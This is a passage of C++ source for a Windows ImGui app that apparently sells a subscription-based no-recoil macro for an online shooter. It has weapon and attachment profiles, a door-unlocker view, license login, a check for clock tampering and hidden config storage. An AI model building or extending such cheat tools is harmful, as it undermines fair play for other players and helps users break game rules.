                std::filesystem::create_directory(config_dir);
                output_log_message("[DEBUG] Created config directory.\n");
                // مخفی کردن پوشه config
                SetFileAttributesW(L"config", FILE_ATTRIBUTE_HIDDEN);
            } catch (...) {
                output_log_message("[DEBUG] Error creating config directory.\n");
            }
        }

        output_log_message("\nUI Window Ready.\n");
        

    } catch (const std::exception& e) {
        // Basic cleanup on initialization error
        std::cerr << "Initialization error: " + std::string(e.what()) << std::endl;
        output_log_message("Initialization error: " + std::string(e.what()) + "\n");
        if (recoil_thread_obj.joinable()) {
            g_recoil_thread_should_run.store(false, std::memory_order_relaxed);
            recoil_thread_obj.join(); // Join if started but failed later
        }
        // ImGui_ImplDX11_Shutdown(); ImGui_ImplWin32_Shutdown(); ImGui::DestroyContext(); // Cleanup happens in cleanup_and_exit
        // CleanupDeviceD3D(); // Cleanup happens in cleanup_and_exit
        // ::DestroyWindow(hwnd); // Destroy happens in main loop or cleanup
        // ::UnregisterClass(wc.lpszClassName, wc.hInstance); // Unregister happens in cleanup
        // WSACleanup(); // Cleanup Winsock on failure
        cleanup_and_exit(); // Call cleanup before returning
        return 1;
    }

    // 8. Main loop
    output_log_message("Entering main application loop...\n");
    bool done = false;
    // Changed clear_color to match the new dark grey theme
    ImVec4 clear_color = ImVec4(0.18f, 0.18f, 0.18f, 1.00f); // Dark grey background
    // متغیر unsaved_changes حذف شد زیرا تغییرات به صورت خودکار اعمال می‌شوند

    // Local bool for ImGui window state, synchronized with atomic
    bool show_config_window_local = show_config_window_atomic.load(std::memory_order_relaxed);

    // Variable to hold the index of the currently selected weapon in the dropdown
    int current_weapon_index = 0; // Default to the first weapon in ALL_PROFILES

    // Initialize buffer from g_door_unlock_code when the application starts
    snprintf(door_code_buffer, sizeof(door_code_buffer), "%d", g_door_unlock_code);


    // Local bool for sound enabled state, synchronized with atomic
    bool sound_enabled_local = g_sound_enabled.load(std::memory_order_relaxed);


    // زمان آخرین بررسی تغییر زمان سیستم
    static auto last_time_check = std::chrono::steady_clock::now();
    
    while (!done) {
        MSG msg;
        // Process all pending messages
        while (::PeekMessage(&msg, NULL, 0U, 0U, PM_REMOVE)) {
            ::TranslateMessage(&msg);
            ::DispatchMessage(&msg);
            if (msg.message == WM_QUIT)
                done = true;
        }
        if (done) break;
        
        // بررسی تغییر زمان سیستم هر 1 ثانیه
        auto now = std::chrono::steady_clock::now();
        if (now - last_time_check > std::chrono::seconds(1)) {
            // بررسی تغییر زمان سیستم
            CheckSystemTimeManipulation();
            last_time_check = now;
        }

        // If the UI window is hidden and there are no messages, wait for one
        // This prevents the loop from consuming excessive CPU when idle
        if (!show_config_window_local && !::PeekMessage(&msg, NULL, 0U, 0U, PM_NOREMOVE)) {
             ::WaitMessage();

             // If an update has completed and exit was requested, break out of the loop
             if (g_exit_after_update.load(std::memory_order_relaxed)) {
                 done = true;
             }

             if (done) break;
             continue; // Go back to the start of the loop to process the message
        }

        // Synchronize local state from atomic before starting ImGui frame
        show_config_window_local = show_config_window_atomic.load(std::memory_order_relaxed);
        sound_enabled_local = g_sound_enabled.load(std::memory_order_relaxed); // Synchronize sound state


        // Start ImGui frame regardless of visibility, but only draw/render if visible
        ImGui_ImplDX11_NewFrame();
        ImGui_ImplWin32_NewFrame();
        ImGui::NewFrame();

        // --- Draw ImGui UI ---
        // Only draw the window content if show_config_window_local is true
        if (show_config_window_local)
        {
            // Get native window size to make ImGui window fill it
            RECT client_rect = {}; // Use {} for value initialization
            ::GetClientRect(hwnd, &client_rect);
            ImVec2 window_size = ImVec2((float)(client_rect.right - client_rect.left), (float)(client_rect.bottom - client_rect.top));

            // Set ImGui window position and size to match native window
            ImGui::SetNextWindowPos(ImVec2(0, 0));
            ImGui::SetNextWindowSize(window_size);

            // Use flags to make the ImGui window look like the main window content
            // NoTitleBar removes the title bar, making it look like one window
            // NoResize, NoMove, NoCollapse, NoBringToFrontOnFocus, NoNavInputs make it fixed
            // ImGuiWindowFlags_MenuBar enables the menu bar within this window
            ImGuiWindowFlags window_flags = ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoBringToFrontOnFocus | ImGuiWindowFlags_NoNavInputs;

            // Add MenuBar flag only if licensed AND not expired
            auto now_check = std::chrono::system_clock::now();
            auto expiration_time_check = g_activation_time + std::chrono::seconds(g_subscription_duration_seconds);

            if (is_licensed.load() && now_check < expiration_time_check) {
                 window_flags |= ImGuiWindowFlags_MenuBar;
            }


            // Use the local bool for ImGui::Begin
            ImGui::Begin("Revo", &show_config_window_local, window_flags); // Changed window title
            
            // Draw rainbow RGB strip at the top of the window
            ImDrawList* draw_list = ImGui::GetWindowDrawList();
            ImVec2 window_pos = ImGui::GetWindowPos();
            
            // Rainbow strip height
            float strip_height = 4.0f;
            
            // Calculate time-based animation
            float time = (float)ImGui::GetTime();
            
            // Draw the rainbow strip across the top of the window
            int segments = 100;
            float segment_width = window_size.x / segments;
            
            for (int i = 0; i < segments; i++) {
                float x1 = window_pos.x + (i * segment_width);
                float x2 = window_pos.x + ((i + 1) * segment_width);
                
                // Calculate rainbow color with animation flowing from left to right
                float hue = fmodf(time * 0.5f - (float)i / segments, 1.0f);
                float r, g, b;
                ImGui::ColorConvertHSVtoRGB(hue, 1.0f, 1.0f, r, g, b);
                ImU32 col32 = ImGui::ColorConvertFloat4ToU32(ImVec4(r, g, b, 1.0f));
                
                // Draw the segment
                draw_list->AddRectFilled(ImVec2(x1, window_pos.y), ImVec2(x2, window_pos.y + strip_height), col32);
            }
            
            // Add a small padding after the rainbow strip
            ImGui::Dummy(ImVec2(0, strip_height + 2.0f));

            // --- Menu Bar (Only visible if licensed AND not expired) ---
            if (is_licensed.load() && now_check < expiration_time_check && ImGui::BeginMenuBar()) {
                // Direct Menu Items on the menu bar
                if (ImGui::MenuItem("Home")) {
                    current_view = ViewState::Home;
                    // Reset capturing state when changing view
                    g_is_capturing_keybind.store(false, std::memory_order_relaxed);
                    g_profile_being_rebound = "";
                }

                if (ImGui::MenuItem("Keybinds")) {
                    current_view = ViewState::Keybinds;
                     // Reset capturing state when changing view
                    g_is_capturing_keybind.store(false, std::memory_order_relaxed);
                    g_profile_being_rebound = "";
                }

                    
                // Added Door Unlocker menu item
                if (ImGui::MenuItem("Door Unlocker")) {
                    current_view = ViewState::DoorUnlocker;
                    // Reset capturing state when changing view
                    g_is_capturing_keybind.store(false, std::memory_order_relaxed);
                    g_profile_being_rebound = "";
                    // Ensure buffer is updated when entering this view
                    snprintf(door_code_buffer, sizeof(door_code_buffer), "%d", g_door_unlock_code);
                }

                 if (ImGui::MenuItem("Subscription")) { // Renamed Support to Subscription
                     current_view = ViewState::Subscription;
                      // Reset capturing state when changing view
                     g_is_capturing_keybind.store(false, std::memory_order_relaxed);
                     g_profile_being_rebound = "";
                 }

                 if (ImGui::MenuItem("Settings")) { // Added Settings menu item
                     current_view = ViewState::Settings;
                     // Reset capturing state when changing view
                     g_is_capturing_keybind.store(false, std::memory_order_relaxed);
                     g_profile_being_rebound = "";
                 }

                 if (ImGui::MenuItem("About Me")) { // Added About Me menu item
                     current_view = ViewState::AboutMe;
                      // Reset capturing state when changing view
                     g_is_capturing_keybind.store(false, std::memory_order_relaxed);
                     g_profile_being_rebound = "";
                 }

                ImGui::EndMenuBar();
            }

            // --- Render content based on current_view ---
            // Re-check license status inside the UI drawing loop
            auto now_ui = std::chrono::system_clock::now();
            // خواندن وضعیت لایسنس (بدون نیاز به میوتکس چون atomic است)
            bool is_currently_licensed_and_valid = is_licensed.load();
            // خواندن داده‌های لایسنس با میوتکس برای نمایش
            std::string start_license_display;
            long long duration_display;
            std::chrono::system_clock::time_point activation_time_display;
            {

                     std::lock_guard<std::mutex> lock(g_license_data_mutex); // قفل کردن قبل از خواندن داده‌های مشترک
                         start_license_display = g_start_license_str; // خواندن تاریخ شروع
                         duration_display = g_subscription_duration_seconds; // خواندن مدت زمان
                         activation_time_display = g_activation_time; // خواندن زمان فعال‌سازی
                     }
                     // --- پایان خواندن امن ---
                        // محاسبه زمان انقضا با داده‌های خوانده شده
            auto expiration_time_ui = activation_time_display + std::chrono::seconds(duration_display);

            // بررسی مجدد وضعیت لایسنس با در نظر گرفتن زمان انقضا
             is_currently_licensed_and_valid = is_currently_licensed_and_valid && (now_ui < expiration_time_ui);

             if (!is_currently_licensed_and_valid) {
                 // --- Login View Content (Always visible if not licensed or expired) ---
                 current_view = ViewState::Login; // Force view to Login if not licensed or expired

                 ImGui::Text("Please enter your license key to activate.");
                 if (is_licensed.load() && now_ui >= expiration_time_ui) {
                     ImGui::TextColored(ImVec4(1.0f, 0.0f, 0.0f, 1.0f), "Your license has expired.");
                 }
                 ImGui::Separator();

                 ImGui::PushItemWidth(300);
                 // Use ImGuiInputTextFlags_Password for masking input
                 // No need for CharsDecimal or other flags unless you want to restrict characters
                 // Enable Ctrl+C, Ctrl+V with ImGuiInputTextFlags_AllowTabInput
                 if (ImGui::InputText("License Key", license_key_input, IM_ARRAYSIZE(license_key_input), ImGuiInputTextFlags_Password | ImGuiInputTextFlags_AllowTabInput)) {
                     // Input changed, potentially mark for recalculation/save if needed later
                 }
                 ImGui::PopItemWidth();

                 // --- Remember Me Checkbox ---
                 ImGui::Text("Remember Me"); // Display the text label
                 ImGui::SameLine(); // Place the next item on the same line
                 ImGui::Checkbox("##RememberMeCheckbox", &g_remember_me);


                 // --- Character Count Validation ---
                 size_t key_length = strlen(license_key_input);
                 bool is_key_length_valid = (key_length >= 7 && key_length <=29);
                 bool is_input_empty = key_length == 0;

                 // Display validation message if needed
                 if (!is_input_empty && !is_key_length_valid) {
                     ImGui::TextColored(ImVec4(1.0f, 1.0f, 0.0f, 1.0f), "License key must be between 8 and 16 characters."); // Yellow warning
                 } else if (is_input_empty) { // Handle empty case explicitly
                      // Optionally display a message for empty input, or just rely on button being disabled
                      // ImGui::TextDisabled("Enter your license key.");
                 }


                // Buy Subscription Button (Now first in row) - با انیمیشن
                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.0f, 0.0f, 1.0f, 1.0f)); // Blue color
                ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.2f, 0.2f, 1.0f, 1.0f)); // Lighter blue on hover
                ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(0.4f, 0.4f, 1.0f, 1.0f)); // Even lighter blue when active
                
                // استفاده از تابع انیمیشن دکمه
                RenderButtonAnimation("Buy Subscription", ImVec2(0, 0), []() {
                    // Open the Discord link
                    ShellExecute(0, "open", "https://discord.gg/f7qQbGwFwZ", 0, 0, SW_SHOW);
                });
                ImGui::PopStyleColor(3); // Pop the 3 color styles

                ImGui::SameLine(); // Place the next element (Free Trial button) on the same line

                // Free Trial Button (placed next to Buy Subscription) - با انیمیشن
                bool is_logging_in_local_ft = g_is_logging_in.load(std::memory_order_relaxed);

                if (is_logging_in_local_ft) {
                    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(1.0f, 0.5f, 0.0f, 0.5f)); // Dimmed Orange color
                    ImGui::PushStyleVar(ImGuiStyleVar_Alpha, ImGui::GetStyle().Alpha * 0.7f); // Slightly transparent
                    ImGui::Button("Processing...");
                    ImGui::PopStyleVar();
                    ImGui::PopStyleColor(1); // Pop dimmed orange
                } else {
                    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(1.0f, 0.5f, 0.0f, 1.0f)); // Orange color
                    // استفاده از تابع انیمیشن دکمه
                    RenderButtonAnimation("Free Trial", ImVec2(0, 0), []() {
                        g_is_logging_in.store(true, std::memory_order_relaxed);
                        // به جای باز کردن سایت، تابع async را اجرا کن
                        std::thread free_trial_thread(perform_free_trial_async);
                        free_trial_thread.detach();
                    });
                    ImGui::PopStyleColor(1); // Pop orange
                }

                ImGui::SameLine(); // Place the next element (Login button) on the same line

                // --- Login Button (Now last in row, next to Free Trial) ---
                bool is_logging_in_local = g_is_logging_in.load(std::memory_order_relaxed);
                // Button enabled only if not logging in AND character length is valid AND input is not empty
                bool login_button_enabled = !is_logging_in_local && is_key_length_valid && !is_input_empty;

                if (is_logging_in_local) {
                    // Button is disabled and shows "Logging in..." while operation is in progress
                    ImGui::PushStyleVar(ImGuiStyleVar_Alpha, ImGui::GetStyle().Alpha * 0.5f); // Dim the button
                    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(1.0f, 1.0f, 0.0f, 1.0f)); // Yellow color for button background
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 0.0f, 0.0f, 1.0f)); // Black text for contrast
                    ImGui::Button("Logging in..."); // Button text changes while capturing
                    ImGui::PopStyleColor(2); // Pop text and button colors
                    ImGui::PopStyleVar(); // Pop alpha
                } else {
                    // Button is enabled/disabled based on login_button_enabled
                    if (!login_button_enabled) {
                         ImGui::PushStyleVar(ImGuiStyleVar_Alpha, ImGui::GetStyle().Alpha * 0.5f); // Dim the button
                    }
                    // استفاده از تابع انیمیشن دکمه برای لاگین
                    if (login_button_enabled) {
                        RenderButtonAnimation("Login", ImVec2(0, 0), [&]() {
                            g_is_logging_in.store(true, std::memory_order_relaxed);
                            // Before starting login, save the config to remember the checkbox state
                            save_config(); // Save config which now includes g_remember_me and potentially license_key_input

                            // Start the login process in a new thread
                            // Pass a copy of the license key input buffer
                            std::thread login_thread(perform_login_async, std::string(license_key_input)); // Pass a copy
                            login_thread.detach(); // Detach the thread so it runs independently

                            // Clear the input field and error message immediately on the main thread
                            license_key_input[0] = '\0';
                            {
                                std::lock_guard<std::mutex> lock(g_login_error_mutex);
                                login_error_message = "";
                            }
                        });
                    } else {
                        // اگر دکمه غیرفعال است، فقط نمایش دهیم بدون انیمیشن
                        ImGui::Button("Login");
                    }
                    if (!login_button_enabled) {
                         ImGui::PopStyleVar(); // Pop the alpha style if disabled
                    }
                }
                // --- End Login Button Modification ---

                // Display error message (read under mutex)
                {
                    std::lock_guard<std::mutex> lock(g_login_error_mutex);
                    if (!login_error_message.empty()) {
                        ImGui::SameLine();
                        ImGui::TextColored(ImVec4(1.0f, 0.0f, 0.0f, 1.0f), "%s", login_error_message.c_str());
                    }
                }

                ImGui::Separator();

                // --- Update / Download Progress UI ---
                bool update_required  = g_update_required.load(std::memory_order_relaxed);
                bool downloading      = g_update_download_in_progress.load(std::memory_order_relaxed);
                bool download_done    = g_update_download_done.load(std::memory_order_relaxed);
                bool download_failed  = g_update_download_failed.load(std::memory_order_relaxed);

                if (update_required) {
                    // Centered small window on top of login UI
                    ImVec2 center = ImGui::GetMainViewport()->GetCenter();
                    ImGui::SetNextWindowPos(center, ImGuiCond_Always, ImVec2(0.5f, 0.5f));
                    // Make the window a bit larger so all text fits without scrollbars
                    ImGui::SetNextWindowSize(ImVec2(420, 190), ImGuiCond_Always);

                    ImGuiWindowFlags flags = ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoMove |
                                             ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoSavedSettings |
                                             ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse;

                    // Build a title showing current version and, if available, new version (e.g. "Updating Core (1.1.2 -> 1.1.3)")
                    std::string update_title = "Updating Core";
                    update_title += " (";
                    update_title += APP_VERSION_NUMBER;
                    {
                        std::lock_guard<std::mutex> lock(g_update_mutex);
                        if (!g_update_new_version.empty()) {
                            update_title += " -> ";
                            update_title += g_update_new_version;
                        }
                    }
                    update_title += ")";

                    if (ImGui::Begin(update_title.c_str(), nullptr, flags)) {
                        ImGui::TextWrapped("A new version of Core is being downloaded.");
                        if (downloading) {
                            ImGui::Text("Status: Downloading...");
                        } else if (download_done && !download_failed) {
                            ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.0f, 1.0f), "Status: Download complete.");
                        } else if (download_failed) {
                            ImGui::TextColored(ImVec4(1.0f, 0.4f, 0.4f, 1.0f), "Status: Download failed.");
                        } else {
                            ImGui::Text("Status: Waiting...");
                        }

                        long long downloaded_bytes = g_update_bytes_downloaded.load(std::memory_order_relaxed);
                        long long total_bytes      = g_update_bytes_total.load(std::memory_order_relaxed);

                        float progress = 0.0f;
                        if (total_bytes > 0) {
                            progress = static_cast<float>(downloaded_bytes) / static_cast<float>(total_bytes);
                        }

                        char progress_text[64];
                        // Show only percentage to the user, without file size
                        snprintf(progress_text, sizeof(progress_text), "%.1f%%", progress * 100.0f);

                        ImGui::Spacing();
                        ImGui::ProgressBar(progress, ImVec2(-1.0f, 0.0f), progress_text);

                        ImGui::Spacing();
                        ImGui::TextWrapped("After the download completes, this app will close and restart automatically.");
                    }
                    ImGui::End();
                }

                 // --- Announcement Section ---
                 if (!g_announcement_fetch_initiated.load(std::memory_order_relaxed)) {
                     std::thread announcement_thread(fetch_announcement_async);
                     announcement_thread.detach();
                     g_announcement_fetch_initiated.store(true, std::memory_order_relaxed);
                 }

                 ImGui::Spacing(); // فاصله قبل از کل بخش اعلانات

                 ImGui::TextColored(ImVec4(0.6f, 0.8f, 1.0f, 1.0f), "Announcements:"); // عنوان با رنگ متفاوت (آبی روشن)
                 ImGui::Separator(); // جداکننده زیر عنوان

                 ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(8.0f, 8.0f)); // اضافه کردن پدینگ داخلی
                 // رنگ پس زمینه برای کادر متن اعلانات
                 ImGui::PushStyleColor(ImGuiCol_ChildBg, ImVec4(0.12f, 0.12f, 0.14f, 1.0f)); // یک رنگ تیره ملایم برای پس زمینه فرزند (خاکستری/آبی تیره)

                 // استفاده از BeginChild برای ایجاد کادر با پس‌زمینه، حاشیه و قابلیت اسکرول
                 // ارتفاع 100 پیکسل، اگر محتوا بیشتر شود اسکرول عمودی ظاهر می‌شود. اسکرول افقی هم فعال است.
                 ImGui::BeginChild("AnnouncementContent", ImVec2(0, 100.0f), true, ImGuiWindowFlags_HorizontalScrollbar); 

                 std::string current_announcement_text;
                 {
                     std::lock_guard<std::mutex> lock(g_announcement_mutex);
                     current_announcement_text = g_announcement_text;
                 }

                 if (current_announcement_text == "Loading announcements...") {
                     ImGui::TextDisabled("%s", current_announcement_text.c_str()); // رنگ کم‌رنگ برای حالت بارگذاری
                 } else if (current_announcement_text.rfind("Error:", 0) == 0 || current_announcement_text == "No announcement or error fetching.") {
                     ImGui::TextColored(ImVec4(1.0f, 0.4f, 0.4f, 1.0f), "%s", current_announcement_text.c_str()); // رنگ قرمز برای خطا
                 } else {
                     ImGui::TextWrapped("%s", current_announcement_text.c_str()); // متن اصلی با قابلیت شکستن خط
                 }

                 ImGui::EndChild();
                ImGui::PopStyleColor(); // Pop ChildBg
                ImGui::PopStyleVar();   // Pop WindowPadding
                // --- End Announcement Section ---
                  
                  // --- End Login View Content ---

            } else { // User is licensed AND valid, show the main content based on current_view
                if (current_view == ViewState::Home) {
                    // --- Home View Content ---
                    // Status Display
                    bool status_profile_active; std::string status_profile;
                    bool ui_toggle_status;
                    { std::lock_guard<std::mutex> lock(profile_mutex);
                      if (!profile_macro_active.load(std::memory_order_relaxed) || current_gun_profile_str.empty()) {
                          profile_macro_active.store(true, std::memory_order_relaxed);
                          if (current_gun_profile_str.empty()) {
                              current_gun_profile_str = PROFILE_AK47;
                          }
                      }
                      status_profile_active = true;
                      ui_toggle_status = ui_toggle_key_pressed.load(std::memory_order_relaxed); // وضعیت کلید UI toggle
                      status_profile = current_gun_profile_str; }

                    // Keep Select Weapon combo in sync with the active profile so all sections refer to the same weapon
                    if (status_profile_active) {
                        for (int i = 0; i < (int)ALL_PROFILES.size(); ++i) {
                            if (ALL_PROFILES[i] == status_profile) {
                                current_weapon_index = i;
                                break;
                            }
                        }
                    }
                    ImGui::Text("UI Toggle Status: "); ImGui::SameLine();
                    if (ui_toggle_status) ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.0f, 1.0f), "Enabled (No Recoil Active)");
                    else ImGui::TextColored(ImVec4(1.0f, 0.0f, 0.0f, 1.0f), "Disabled (Press %s to enable No Recoil)", vk_code_to_string(g_ui_toggle_key.load()).c_str());
                    
                    ImGui::Text("Profile Status: "); ImGui::SameLine();
                    if (status_profile_active) {
                        // نمایش وضعیت پروفایل فعال به همراه نام پروفایل و اطلاعات اضافی
                        std::string scope_attachment = "";
                        std::string barrel_attachment = "";
                        
                        if (g_attachment_states.count(status_profile)) {
                            const auto& state = g_attachment_states.at(status_profile);
                            
                            // بررسی و ذخیره نوع دوربین (scope)
                            if (state.holo) scope_attachment = "Holo";
                            else if (state.x8) scope_attachment = "8x";
                            else if (state.x16) scope_attachment = "16x";
                            else if (state.handmade) scope_attachment = "Handmade";
                            
                            // بررسی و ذخیره نوع لوله (barrel)
                            if (state.muzzle_brake) barrel_attachment = "Muzzle Brake";
                            
                            // بررسی MuzzleBoost فقط برای اسلحه‌های خاص
                            const std::string& current_profile_check = status_profile; // Use a local copy for checks
                            if (current_profile_check == PROFILE_AK47 || current_profile_check == PROFILE_LR300 || current_profile_check == PROFILE_THOMPSON || current_profile_check == PROFILE_MP5A4) {
                                if (state.muzzle_boost) barrel_attachment = "Muzzle Boost";
                            }
                        }
                        // ساخت رشته نهایی اتصالات
                        std::string active_attachments_str = "";
                        
                        // اگر هر دو نوع اتصال وجود داشته باشد
                        if (!scope_attachment.empty() && !barrel_attachment.empty()) {
                            active_attachments_str = " (" + scope_attachment + " - " + barrel_attachment + ")";
                        }
                        // اگر فقط scope وجود داشته باشد
                        else if (!scope_attachment.empty()) {
                            active_attachments_str = " (" + scope_attachment + ")";
                        }
                        // اگر فقط barrel وجود داشته باشد
                        else if (!barrel_attachment.empty()) {
                            active_attachments_str = " (" + barrel_attachment + ")";
                        }
                        
                        ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.0f, 1.0f), "Active - %s%s", status_profile.c_str(), active_attachments_str.c_str());
                    }


                    ImGui::Separator();

                    // Settings Inputs
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 0.0f, 1.0f, 1.0f)); // Blue color
                    ImGui::Text("Settings:");
                    ImGui::PopStyleColor(); // Revert color
                    ImGui::SameLine(); HelpMarker("Changes are applied automatically"); // به‌روزرسانی متن راهنما
                    ImGui::PushItemWidth(180); // Make sliders wider

                    // Use SliderScalar for Sensitivity with clamping and %.1f format for 0.1 steps
                    if (ImGui::SliderScalar("Sensitivity", ImGuiDataType_Double, &SENSITIVITY, &MIN_SENS, &MAX_SENS, "%.1f")) {
                        // اعمال خودکار تغییرات
                        recalculate_all_profiles_threadsafe();
                        // نمایش پیام بازخورد
                        show_feedback_message("Sensitivity Updated & Profiles Recalculated!");
                        // ذخیره خودکار تنظیمات در صورت فعال بودن Auto Save
                        AutoSaveIfEnabled();
                    }
                    // Reduced spacing between sliders
                    ImGui::SameLine(); // Use default minimal spacing

                    // Use SliderScalar for FOV with clamping and %.1f format
                    if (ImGui::SliderScalar("FOV", ImGuiDataType_Double, &FOV, &MIN_FOV, &MAX_FOV, "%.1f")) {
                        // اعمال خودکار تغییرات
                        recalculate_all_profiles_threadsafe();
                        // نمایش پیام بازخورد
                        show_feedback_message("Profiles Recalculated Automatically!");
                        // ذخیره خودکار تنظیمات در صورت فعال بودن Auto Save
                        AutoSaveIfEnabled();
                    }
                    ImGui::PopItemWidth();

                    // --- Weapon Selection ---
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 1.0f, 0.0f, 1.0f)); // Yellow color
                    ImGui::Text("Select Weapon:");
                    ImGui::PopStyleColor(); // Revert color
                    ImGui::PushItemWidth(200);
                    // Create a C-style array of const char* for the combo box
                    std::vector<const char*> profiles_cstr;
                    for (const auto& profile : ALL_PROFILES) {
                        profiles_cstr.push_back(profile.c_str());
                    }
                    if (ImGui::Combo("##WeaponSelect", &current_weapon_index, profiles_cstr.data(), profiles_cstr.size())) {
                        // Weapon selection changed via navigation inside combo, update the current gun profile string
                        {
                            std::lock_guard<std::mutex> lock(profile_mutex);
                            current_gun_profile_str = ALL_PROFILES[current_weapon_index];
                            // When weapon changes, arm the profile macro
                            profile_macro_active.store(true); // Use renamed variable
                            output_log_message("Weapon selected: " + current_gun_profile_str + ". Profile Macro Active.\n"); // Updated log message
                        }
                        // Recalculate profiles immediately after changing weapon? Or only on "Apply"?
                        // Let's stick to "Apply" button for recalculation to avoid performance issues on every selection change.
                    }

                    ImGui::PopItemWidth();
                    ImGui::Separator();

                    // --- Attachment Toggles (Based on Active Profile / Selected Weapon) ---
                    // Determine which weapon's attachments we are editing:
                    // Prefer the currently active profile shown in Profile Status; if none, fall back to combo selection.
                    std::string attachments_weapon_name = status_profile_active ? status_profile : ALL_PROFILES[current_weapon_index];

                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.5f, 0.0f, 1.0f)); // Orange color
                    ImGui::Text("Attachments for %s:", attachments_weapon_name.c_str());
                    ImGui::PopStyleColor(); // Revert color
                    ImGui::SameLine(); HelpMarker("Recalculates profiles automatically when changed.");

                    // Get the attachment state for the chosen weapon
                    AttachmentState& current_attachments = g_attachment_states[attachments_weapon_name];
                    bool attachment_changed = false; // Track if any attachment changed in this frame

                    ImGui::SetNextItemOpen(true, ImGuiCond_Once);
                    if (ImGui::CollapsingHeader("Scopes")) {
                        // Scopes (assuming all guns can have these, but multipliers differ)
                        if (ImGui::Checkbox("Holo Sight", &current_attachments.holo)) {
                            if(current_attachments.holo){ current_attachments.x8=false; current_attachments.x16=false; current_attachments.handmade=false;}
                            attachment_changed = true;
                        }
                        if (ImGui::Checkbox("8x Scope", &current_attachments.x8)) {
                             if(current_attachments.x8){ current_attachments.holo=false; current_attachments.x16=false; current_attachments.handmade=false;}
                             attachment_changed = true;
                        }
                        if (ImGui::Checkbox("16x Scope", &current_attachments.x16)) {
                             if(current_attachments.x16){ current_attachments.holo=false; current_attachments.x8=false; current_attachments.handmade=false;}
                             attachment_changed = true;
                        }
                         if (ImGui::Checkbox("Handmade Sight", &current_attachments.handmade)) {
                             if(current_attachments.handmade){ current_attachments.holo=false; current_attachments.x8=false; current_attachments.x16=false;}
                             attachment_changed = true;
                        }
                    }

                    ImGui::SetNextItemOpen(true, ImGuiCond_Once);
                    if (ImGui::CollapsingHeader("Barrels")) {
                        if (ImGui::Checkbox("Muzzle Boost", &current_attachments.muzzle_boost)) {
                            if (current_attachments.muzzle_boost) {
                                current_attachments.muzzle_brake = false;
                            }
                            attachment_changed = true;
                        }
                        if (ImGui::Checkbox("Muzzle Brake", &current_attachments.muzzle_brake)) {
                            if (current_attachments.muzzle_brake) {
                                current_attachments.muzzle_boost = false;
                            }
                            attachment_changed = true;
                        }

                        // Recalculate if attachments changed
                        if (attachment_changed) {
                            recalculate_all_profiles_threadsafe();
                            output_log_message("Attachments changed, profiles recalculated.\n");
                            g_feedback_message = "Attachments Updated!";
                            g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3);
                            if (AUTO_SAVE_ENABLED) {
                                save_config();
                                output_log_message("Attachment settings auto-saved.\n");
                            }
                        }
                    }

                    ImGui::Separator();

                    // Moved Sound Settings to its own view

                    ImGui::Separator();
                    
                    // Update the text to show current LMB and RMB keybinds
                    ImGui::TextWrapped("Recoil active when profile is Active, and %s+%s held.", // Updated text
                                       vk_code_to_string(g_lmb_key.load(std::memory_order_relaxed)).c_str(),
                                       vk_code_to_string(g_rmb_key.load(std::memory_order_relaxed)).c_str());

                    ImGui::TextWrapped("Press '%s' key to toggle UI visibility.", vk_code_to_string(g_ui_toggle_key.load(std::memory_order_relaxed)).c_str());
                    ImGui::TextWrapped("Press '%s' key to exit the application.", vk_code_to_string(g_exit_app_key.load(std::memory_order_relaxed)).c_str());


                } else if (current_view == ViewState::Keybinds) {
                    // --- Keybinds View Content ---
                    ImGui::Text("Keybinds Configuration");
                    ImGui::Separator();;

                    // Display and allow changing special keybinds
                    ImGui::Text("UI Toggle Key:");
                    ImGui::SameLine(180); // Adjusted alignment
                    if (g_is_capturing_keybind.load(std::memory_order_relaxed) && g_profile_being_rebound == "UI_TOGGLE") {
                        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(1.0f, 0.5f, 0.0f, 1.0f)); // Orange color
                        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(1.0f, 0.6f, 0.2f, 1.0f)); // Lighter orange on hover
                        ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(1.0f, 0.7f, 0.3f, 1.0f)); // Even lighter orange when active
                        ImGui::Button("Press a key..."); // Button text changes while capturing
                        ImGui::PopStyleColor(3); // Pop the 3 color styles
                    } else {
                        if (ImGui::Button("Change##UIToggle")) {
                            g_is_capturing_keybind.store(true, std::memory_order_relaxed);
                            g_profile_being_rebound = "UI_TOGGLE";
                            output_log_message("Capturing keybind for UI Toggle...\n");
                        }
                        ImGui::SameLine();
                        ImGui::Text("%s", vk_code_to_string(g_ui_toggle_key.load(std::memory_order_relaxed)).c_str());
                    }

                    ImGui::Text("Exit Application Key:");
                    ImGui::SameLine(180); // Adjusted alignment
                    if (g_is_capturing_keybind.load(std::memory_order_relaxed) && g_profile_being_rebound == "EXIT_APP") {
                        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(1.0f, 0.5f, 0.0f, 1.0f)); // Orange color
                        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(1.0f, 0.6f, 0.2f, 1.0f)); // Lighter orange on hover
                        ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(1.0f, 0.7f, 0.3f, 1.0f)); // Even lighter orange when active
                        ImGui::Button("Press a key..."); // Button text changes while capturing
                        ImGui::PopStyleColor(3); // Pop the 3 color styles
                    } else {
                        if (ImGui::Button("Change##ExitApp")) {
